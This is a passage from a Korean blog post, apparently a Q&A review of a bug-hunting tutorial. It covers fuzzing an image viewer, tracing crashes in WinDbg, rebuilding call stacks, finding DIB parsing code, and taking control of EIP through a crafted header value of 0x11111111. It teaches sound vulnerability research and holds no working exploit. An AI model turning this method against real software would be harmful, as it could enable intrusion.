&#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC544;&#xB0B4;&#xAE30; &#xC704;&#xD568;&#xC778;&#xB370; &#xC774;&#xB807;&#xAC8C; &#xC774;&#xD574;&#xD574;&#xB3C4; &#xB420;&#xC9C0;? </p><ul><li>&#xB9DE;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h1 id="Q5-&#xD30C;&#xC77C;&#xC774;-&#xB85C;&#xB4DC;&#xB41C;-&#xC704;&#xCE58;"><a href="#Q5-&#xD30C;&#xC77C;&#xC774;-&#xB85C;&#xB4DC;&#xB41C;-&#xC704;&#xCE58;" class="headerlink" title="Q5. &#xD30C;&#xC77C;&#xC774; &#xB85C;&#xB4DC;&#xB41C; &#xC704;&#xCE58;"></a>Q5. &#xD30C;&#xC77C;&#xC774; &#xB85C;&#xB4DC;&#xB41C; &#xC704;&#xCE58;</h1><ol><li><p>&#xD30C;&#xC77C;&#xC774; &#xB85C;&#xB4DC; &#xB41C;&#xB2E4;&#xB294; &#xAC1C;&#xB150;? (&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xD2B9;&#xC815;&#xD55C; &#xC778;&#xD48B; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xBA74; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC774; &#xBA54;&#xBAA8;&#xB9AC;&#xC0C1;&#xC5D0; &#xB85C;&#xB4DC;&#xAC00; &#xB418;&#xB294; &#xAC83;&#xC744; &#xC758;&#xBBF8;??) </p><ul><li>&#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xC774;&#xBBF8;&#xC9C0; &#xBDF0;&#xC5B4;&#xB294; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xBCF4;&#xAE30;&#xC704;&#xD55C; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774;&#xBBC0;&#xB85C; &#xC6B0;&#xB9AC;&#xAC00; &#xBCF4;&#xAE38; &#xC6D0;&#xD558;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xBDF0;&#xC5B4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xC62C;&#xB824; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>&#xB9CC;&#xC57D; &#xADF8;&#xB807;&#xB2E4;&#xBA74;, &#xB610;&#xD55C; &#xC774; <strong>&#xD30C;&#xC77C;&#xC774; &#xBA54;&#xBAA8;&#xB9AC; &#xC0C1;&#xC5D0; &#xB85C;&#xB4DC;&#xB41C; &#xC704;&#xCE58;&#xB97C; &#xC54C;&#xC544;&#xC57C;&#xD558;&#xB294; &#xC774;&#xC720;</strong>&#xB97C; &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xCD94;&#xD6C4;&#xC5D0; &#xC774; &#xACF3;&#xC5D0;&#xC11C; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC640; &#xAC12;&#xC744; &#xC8FC;&#xACE0;&#xBC1B;&#xB294; &#xC704;&#xCE58;&#xB97C; &#xC54C;&#xAE30;&#xC704;&#xD574;&#xC11C;&#xB77C;&#xB294; &#xAC83;&#xC740; &#xC54C;&#xACA0;&#xB294;&#xB370;, &#xADF8;&#xB85C; &#xB9D0;&#xBBF8;&#xC554;&#xC544; &#xD560; &#xC218; &#xC788;&#xB294; &#xC77C; (&#xC775;&#xC2A4;? &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xC11D;..?) &#xC774; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xC798; &#xAC10;&#xC774; &#xC7A1;&#xD788;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xBCC0;&#xD615;&#xB41C; &#xD5E4;&#xB354;&#xC5D0; &#xC758;&#xD574; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xD06C;&#xAE30;&#xBCF4;&#xB2E4; &#xB354; &#xD070; &#xAC12;&#xC744; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC;&#xC2DC;&#xD0A4;&#xAC8C; &#xB418;&#xBA74; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; &#xB098;&#xC911;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB420; &#xAC12;&#xC744; &#xD2B9;&#xC815;&#xD55C; &#xAC12;&#xC73C;&#xB85C; &#xB36E;&#xAC8C;&#xB418;&#xC5B4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xD750;&#xB984;&#xC744; &#xC870;&#xC791;&#xD574; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC81C;&#xC77C; &#xC911;&#xC694;&#xD55C; &#xC774;&#xC720;&#xB294; &#xBCF4;&#xACE0;&#xC11C;&#xB97C; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC791;&#xC131;&#xD574;&#xC57C;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC99D;&#xBA85;&#xC744; &#xC704;&#xD574; &#xAF2D; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;!</li></ul></li></ol><h1 id="Q6-&#xC708;&#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xC11C;-WARNING"><a href="#Q6-&#xC708;&#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xC11C;-WARNING" class="headerlink" title="Q6. &#xC708;&#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xC11C; WARNING"></a>Q6. &#xC708;&#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xC11C; WARNING</h1><p><img src="/2021/11/07/juntheworld/bughunting-tutorial-review/image-20210915224007813.png" alt="./bughunting-tutorial-review/image-20210915224007813"></p><ul><li>&#xC708;&#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xC11C; WARNING&#xC740; &#xCF5C;&#xC2A4;&#xD0DD;&#xC774; &#xAE68;&#xC9C4; &#xAC83;&#xC744; &#xC54C;&#xB824;&#xC900;&#xB2E4;&#xACE0; &#xC54C;&#xACE0; &#xC788;&#xB294;&#xB370;, &#xC774;&#xAC8C; &#xC798;&#xBABB;&#xB418;&#xC5B4;&#xC11C; &#xBABB;&#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xACBD;&#xC6B0; &#xC708;&#xB514;&#xBC84;&#xAC70;&#xC5D0;&#xC11C; &#xC544;&#xB798;&#xCABD;&#xC5D0; &#xB098;&#xC640;&#xC788;&#xB294; &#xC815;&#xBCF4;&#xB4E4;&#xB3C4; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xAC83;&#xC778;&#xC9C0;? &#xC544;&#xB2C8;&#xBA74; WARNING&#xC744; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC704;&#xCABD;&#xC744; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xAC83;&#xC778;&#xAC00;&#xC694; &#xC804;&#xBD80;&#xB2E4; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xAC83;&#xC778;&#xC9C0;?<ul><li>&#xCF00;&#xC774;&#xC2A4;&#xB9C8;&#xB2E4; &#xB2E4;&#xB985;&#xB2C8;&#xB2E4;.</li></ul></li></ul><h1 id="Q7-&#xBD84;&#xC11D;-&#xC2DC;&#xC791;-&#xC9C0;&#xC810;-&#xCC3E;&#xAE30;"><a href="#Q7-&#xBD84;&#xC11D;-&#xC2DC;&#xC791;-&#xC9C0;&#xC810;-&#xCC3E;&#xAE30;" class="headerlink" title="Q7. &#xBD84;&#xC11D; &#xC2DC;&#xC791; &#xC9C0;&#xC810; &#xCC3E;&#xAE30;"></a>Q7. &#xBD84;&#xC11D; &#xC2DC;&#xC791; &#xC9C0;&#xC810; &#xCC3E;&#xAE30;</h1><p><img src="/2021/11/07/juntheworld/bughunting-tutorial-review/image-20210915224030807.png" alt="./bughunting-tutorial-review/image-20210915224030807"></p><ul><li><strong>&#xC2DC;&#xB4DC;&#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xBBA4;&#xD14C;&#xC774;&#xC158;&#xB41C; &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xACE0;, &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB0B4;&#xC5D0;&#xC11C; &#xADF8; &#xBD80;&#xBD84;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD55C;&#xB2E4;&#xB294; &#xAC83;</strong>&#xC740; &#xC774;&#xD574;&#xAC00; &#xAC00;&#xB294;&#xB370;. &#xC774;&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC3E;&#xC544;&#xC57C; &#xD558;&#xB294;&#xC9C0;??<ul><li>&#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC591;&#xD569;&#xB2C8;&#xB2E4;. &#xD0D1;-&#xB2E4;&#xC6B4; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xCB49; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xCC3E;&#xB294; &#xBC29;&#xC2DD;&#xACFC; &#xBC14;&#xD140;-&#xC5C5; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD06C;&#xB798;&#xC26C; &#xC9C0;&#xC810;&#xBD80;&#xD130; &#xD0C0;&#xACE0; &#xC62C;&#xB77C;&#xAC00;&#xB294; &#xBC29;&#xC2DD;&#xC774; &#xC788;&#xB294;&#xB370;, &#xD568;&#xC218; &#xD558;&#xB098;&#xC529; &#xAC70;&#xCE60;&#xB54C;&#xB9C8;&#xB2E4; Q1-1&#xC5D0;&#xC11C; &#xB9D0;&#xD55C; string search&#xB97C; &#xD1B5;&#xD574; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC; &#xB418;&#xC5C8;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xC5B4;&#xB290;&#xC9C0;&#xC810;&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xB85C;&#xB4DC; &#xB418;&#xACE0;, &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>BM &#xC774;&#xB77C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC774; &#xC788;&#xB294;&#xC9C0; &#xCC3E;&#xC544;&#xBCF4;&#xAC70;&#xB098;, &#xCF5C;&#xC2A4;&#xD0DD;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xD558;&#xB098;&#xD558;&#xB098; &#xBCF4;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xB418;&#xB294; &#xC774;&#xC720;, &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xC5D0;&#xC11C; &#xC774;&#xC911;&#xC5D0; &#xC544;&#xBB34;&#xAC70;&#xB098; &#xBCF4;&#xB294; &#xC774;&#xC720;..(<code>InLoader+0x2590</code>&#xAC00; &#xBB34;&#xC5C7;&#xC744; &#xB73B;&#xD558;&#xB294; &#xAC74;&#xC9C0;.. ub&#xB85C; &#xADF8; &#xC8FC;&#xBCC0; &#xC720;&#xC694;&#xD55C; &#xB9AC;&#xD134;&#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xCC3E;&#xB294; &#xC774;&#xC720;..) &#xC870;&#xCC28; &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.<ul><li>&#x2018;BM&#x2019;&#xC774;&#xB77C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCC3E;&#xB294; &#xC774;&#xC720;&#xB294; dib &#xD30C;&#xC77C;&#xC758; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xAC00; &#x2018;BM&#x2019;&#xC774;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xC74C; &#xB85C;&#xB4DC;&#xC2DC;&#xD0AC; &#xB54C; &#xD30C;&#xC77C; &#xC2DC;&#xADF8;&#xB2C8;&#xCC98;&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xAC01; &#xD30C;&#xC77C;&#xC5D0; &#xC54C;&#xB9DE;&#xC740; &#xB8E8;&#xD2F4;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xB294;&#xB370; &#xC544;&#xC774;&#xB2E4;&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xAC80;&#xC0C9;&#xD588;&#xC744; &#xB54C; &#x2018;BM&#x2019;&#xC774; &#xC788;&#xC73C;&#xBA74; &#xADF8; &#xBD80;&#xBD84;&#xBD80;&#xD130; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;. &#xC5C6;&#xC73C;&#xBA74; &#xC190;&#xC218; &#xCC3E;&#xC544;&#xC57C;&#xACA0;&#xC8E0;.</li><li>&#xCF5C;&#xC2A4;&#xD0DD;&#xC774; &#xC81C;&#xB300;&#xB85C; &#xB098;&#xC624;&#xBA74; &#xD30C;&#xC77C;&#xC774; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xC704;&#xCE58;&#xB97C; &#xC27D;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xB610;&#xD55C; &#xB9AC;&#xD134;&#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB77C;&#xBA74; &#xBC14;&#xB85C;&#xC704; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC774; call&#xC774;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370; ret&#xC77C;&#xB54C; &#xC774;&#xC8FC;&#xC18C;&#xB294; &#xC6B0;&#xC5F0;&#xD788; &#xADF8; &#xBAA8;&#xB4C8;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xC5C8;&#xB358; &#xAC83; &#xBFD0;&#xC774;&#xB77C;&#xACE0; &#xD588;&#xB294;&#xB370;.. <strong>&#xC774; &#xC8FC;&#xC18C;&#xAC00; &#xADF8; &#xBAA8;&#xB4C8;&#xC744; &#xAC00;&#xB9AC;&#xD0A4;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xAC83;</strong>&#xC774; &#xC5B4;&#xB5A4; &#xC758;&#xBBF8;&#xC778;&#xC9C0; &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.<ul><li>Q3-1&#xC5D0;&#xC11C; &#xB9D0;&#xD588;&#xB4EF;&#xC774; &#xCF5C;&#xC2A4;&#xD0DD;&#xC740; &#xB2E4;&#xB978; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD588;&#xC744; &#xB54C; &#xC313;&#xC774;&#xAC8C; &#xB418;&#xB294;&#xB370; ret&#xC740; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xBBC0;&#xB85C; &#xC6B0;&#xC5F0;&#xD788; &#xC2A4;&#xD0DD;&#xC5D0; &#xC788;&#xC5C8;&#xB358; &#xAC12;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul><h1 id="Q8-&#xD5E4;&#xB354;-&#xC815;&#xBCF4;&#xB97C;-&#xAC00;&#xC9C0;&#xACE0;-&#xC788;&#xB294;-&#xBD80;&#xBD84;"><a href="#Q8-&#xD5E4;&#xB354;-&#xC815;&#xBCF4;&#xB97C;-&#xAC00;&#xC9C0;&#xACE0;-&#xC788;&#xB294;-&#xBD80;&#xBD84;" class="headerlink" title="Q8. &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xBD80;&#xBD84;"></a>Q8. &#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xBD80;&#xBD84;</h1><p><img src="/2021/11/07/juntheworld/bughunting-tutorial-review/image-20210915230056194.png" alt="./bughunting-tutorial-review/image-20210915230056194"></p><ol><li><p>&#xD5E4;&#xB354; &#xC815;&#xBCF4;&#xB97C; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC774;&#xB77C;&#xB294;&#xAC8C; &#xBB54;&#xC9C0; ? (&#xC989;, <strong>&#xBD80;&#xBD84;</strong> &#xC774;&#xB77C;&#xB294; &#xAC83;&#xC774; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4; &#xD2B9;&#xC815; &#xBAA8;&#xB4C8;? &#xD568;&#xC218;? &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;?)</p><ul><li>&#xB9D0; &#xADF8;&#xB300;&#xB85C; &#xC774;&#xBBF8;&#xC9C0; &#xC815;&#xBCF4;&#xB97C; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xD5E4;&#xB354;&#xAC00; &#xB2F4;&#xAE34; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB9D0;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li><li><p>&#xB610; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xBC29;&#xBC95; (&#xD2B9;&#xC815; &#xC778;&#xC2A4;&#xD2B8;&#xB7ED;&#xC158;&#xC5D0;&#xC11C; &#xD574;&#xB2F9;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC; &#xC548;&#xC5D0; &#xC788;&#xB294; &#xC8FC;&#xC18C;&#xB77C;&#xBA74; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB77C;&#xACE0; &#xC778;&#xC9C0;&#xD558;&#xB294; &#xAC83;? &#xC774;&#xB97C; &#xC704;&#xD574;&#xC11C; &#xC774;&#xC804;&#xC5D0; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; &#xC5B4;&#xB514;&#xBD80;&#xD130; &#xC5B4;&#xB514;&#xC778;&#xC9C0; &#xC0AC;&#xC804;&#xC5D0; &#xCC3E;&#xC544;&#xB0B4;&#xB824;&#xACE0; &#xD588;&#xB358; &#xAC83;?? &#xC81C;&#xAC00; &#xC774;&#xD574;&#xD55C; &#xAC83;&#xC5D0; &#xD655;&#xC2E0;&#xC774; &#xC798; &#xAC00;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;)</p><ul><li>ba &#xBA85;&#xB839;&#xC5B4;&#xB85C; &#xBA54;&#xBAA8;&#xB9AC; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370; r &#xC635;&#xC158;&#xC744; &#xC8FC;&#xBA74; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC77D;&#xC744; &#xC2DC;&#xC810;&#xC5D0; &#xBE0C;&#xB808;&#xC774;&#xD06C; &#xD3EC;&#xC778;&#xD2B8;&#xAC00; &#xAC78;&#xB9AC;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h1 id="Q9-&#xCF5C;&#xC2A4;&#xD0DD;&#xC744;-&#xBCF5;&#xAD6C;&#xD558;&#xB294;-&#xBC29;&#xBC95;"><a href="#Q9-&#xCF5C;&#xC2A4;&#xD0DD;&#xC744;-&#xBCF5;&#xAD6C;&#xD558;&#xB294;-&#xBC29;&#xBC95;" class="headerlink" title="Q9. &#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xBC29;&#xBC95;"></a>Q9. &#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xBC29;&#xBC95;</h1><ol><li>&#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xACE0; &#xCC9C;&#xCC9C;&#xD788; &#xB530;&#xB77C;&#xAC00;&#xB294; &#xACFC;&#xC815;&#xC744; &#xBCF4;&#xC5EC;&#xC8FC;&#xC168;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5B4;&#xB5BB;&#xAC8C; &#xD558;&#xC2E0;&#xAC74;&#xC9C0; &#xAD81;&#xAE08;&#xD569;&#xB2C8;&#xB2E4;!<ul><li>&#xC9C8;&#xBB38;&#xC5D0; &#xB2F5;&#xBCC0;&#xD558;&#xB294; &#xD544;&#xC790;&#xB294; &#xD06C;&#xB798;&#xC26C; &#xBC1C;&#xC0DD; &#xC2DC; &#xD568;&#xC218; &#xD504;&#xB864;&#xB85C;&#xADF8; &#xC2DC;&#xC810;&#xC5D0; esp&#xB97C; &#xB298;&#xB9AC;&#xAE30;&#xC804; &#xC2A4;&#xD0DD; &#xCD5C;&#xC0C1;&#xB2E8;&#xC5D0; &#xC788;&#xB294; &#xB9AC;&#xD134;&#xC5B4;&#xB4DC;&#xB808;&#xC2A4;&#xB97C; &#xCC3E;&#xC544;&#xB0B4;&#xC11C; &#xC774;&#xB7F0; &#xACFC;&#xC815;&#xC744; &#xBC18;&#xBCF5;&#xD574; &#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xBCF5;&#xAD6C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h1 id="Q10-&#xD06C;&#xB798;&#xC2DC;-&#xBD84;&#xC11D;&#xC774;&#xD6C4;-eip-&#xC7A1;&#xAE30;"><a href="#Q10-&#xD06C;&#xB798;&#xC2DC;-&#xBD84;&#xC11D;&#xC774;&#xD6C4;-eip-&#xC7A1;&#xAE30;" class="headerlink" title="Q10. &#xD06C;&#xB798;&#xC2DC; &#xBD84;&#xC11D;&#xC774;&#xD6C4; eip &#xC7A1;&#xAE30;"></a>Q10. &#xD06C;&#xB798;&#xC2DC; &#xBD84;&#xC11D;&#xC774;&#xD6C4; eip &#xC7A1;&#xAE30;</h1><p><img src="/2021/11/07/juntheworld/bughunting-tutorial-review/image-20210915230913412.png" alt="./bughunting-tutorial-review/image-20210915230913412"></p><ol><li>&#xD06C;&#xB798;&#xC26C; &#xBD84;&#xC11D;&#xC774;&#xD6C4; eip&#xB97C; &#xC7A1;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xC2E4;&#xD589;&#xD30C;&#xC77C; &#xAC12;&#xC744; 11111111&#xB85C; &#xC218;&#xC815;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xAC12;&#xC744; 11111111&#xB85C; &#xBC14;&#xAFD4;&#xC11C; &#xB2E4;&#xC2DC; &#xC2E4;&#xD589;&#xD55C;&#xAC74;&#xC9C0;? &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC5B4;&#xB5A4; &#xC791;&#xC5C5;&#xC744; &#xD558;&#xC2E0;&#xAC74;&#xC9C0; &#xC5EC;&#xB5A4; &#xC785;&#xB825; &#xAC12;&#xC744; &#xBC14;&#xAFB8;&#xC2E0; &#xAC74;&#xC9C0;<ul><li>11111111&#xB85C; &#xBC14;&#xAFD4;&#xC11C; &#xB2E4;&#xC2DC; &#xC2E4;&#xD589;&#xD55C; &#xAC83;&#xC774; &#xB9DE;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ol><h1 id="Q11-0x11111111&#xC774;-&#xAC00;&#xB9AC;&#xD0A4;&#xB294;-&#xB370;&#xC774;&#xD130;&#xC640;-&#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xC758;-&#xC624;&#xD504;&#xC14B;"><a href="#Q11-0x11111111&#xC774;-&#xAC00;&#xB9AC;&#xD0A4;&#xB294;-&#xB370;&#xC774;&#xD130;&#xC640;-&#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xC758;-&#xC624;&#xD504;&#xC14B;" class="headerlink" title="Q11. 0x11111111&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xC640; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xC758; &#xC624;&#xD504;&#xC14B;"></a>Q11. 0x11111111&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xC640; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xC758; &#xC624;&#xD504;&#xC14B;</h1><p><img src="/2021/11/07/juntheworld/bughunting-tutorial-review/image-20210915230905032.png" alt="./bughunting-tutorial-review/image-20210915230905032"></p><ol><li>0x11111111&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xB780;? (&#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC624;&#xD504;&#xC14B;&#xC774; eax&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; &#xC77C;&#xCE58;&#xD558;&#xB0D0;..?)<ul><li>Q10-1&#xC758; &#xC774;&#xBBF8;&#xC9C0;&#xC5D0;&#xC11C; <code>mov [eax], edx</code> &#xACFC;&#xC815;&#xC744; &#xC9C0;&#xB0A0;&#xB54C; 0x11111111&#xC758; &#xC8FC;&#xC18C;&#xC548;&#xC5D0; &#xC720;&#xD6A8;&#xD55C; &#xAC12;&#xC774; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xC5B4;&#xC57C; &#xD574;&#xB2F9; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC9C0;&#xB0A0; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xB610; 0x11111111&#xC740; &#xADF8;&#xB0E5; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xB123;&#xC740; &#xB370;&#xC774;&#xD130; &#xC778;&#xAC83;&#xC73C;&#xB85C; &#xC774;&#xD574;&#xD588;&#xB294;&#xB370;, &#xC774; &#xB370;&#xC774;&#xD130;&#xAC00; &#xBB34;&#xC5C7;&#xC778;&#xAC00;&#xB97C; &#xAC00;&#xB9AC;&#xD0A8;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xC5B4;&#xB5A4; &#xC758;&#xBBF8;&#xC778;&#xC9C0;?<ul><li>Q11-1 &#xB2F5;&#xBCC0;&#xC744; &#xCC38;&#xACE0;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</li></ul></li><li>&#xB610; &#xC774;&#xB140;&#xC11D;&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; eax&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xB370;&#xC774;&#xD130;&#xC758; &#xC624;&#xD504;&#xC14B;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB294;&#xC9C0; &#xC5EC;&#xBD80;&#xB97C; &#xCC3E;&#xB294; &#xC774;&#xC720;&#x2026;? &#xAC00; &#xBB34;&#xC5C7;&#xC778;&#xC9C0;<ul><li>&#xC624;&#xD504;&#xC14B;&#xC774; &#xB2E4;&#xB97C; &#xACBD;&#xC6B0;&#xB294; &#xAC70;&#xC758; &#xC5C6;&#xC9C0;&#xB9CC; &#xB9CC;&#xC57D; &#xB2E4;&#xB97C; &#xACBD;&#xC6B0; &#xB054;&#xCC0D;&#xD55C; &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;..</li></ul></li><li>0x11111111 - 0x101cb056 &#xC640; &#xAC19;&#xC740; &#xC5F0;&#xC0B0;&#xC744; &#xD558;&#xB294; &#xC774;&#xC720;<ul><li>call [ecx-4]&#xC5D0;&#xC11C; &#xD06C;&#xB798;&#xC26C;&#xAC00; 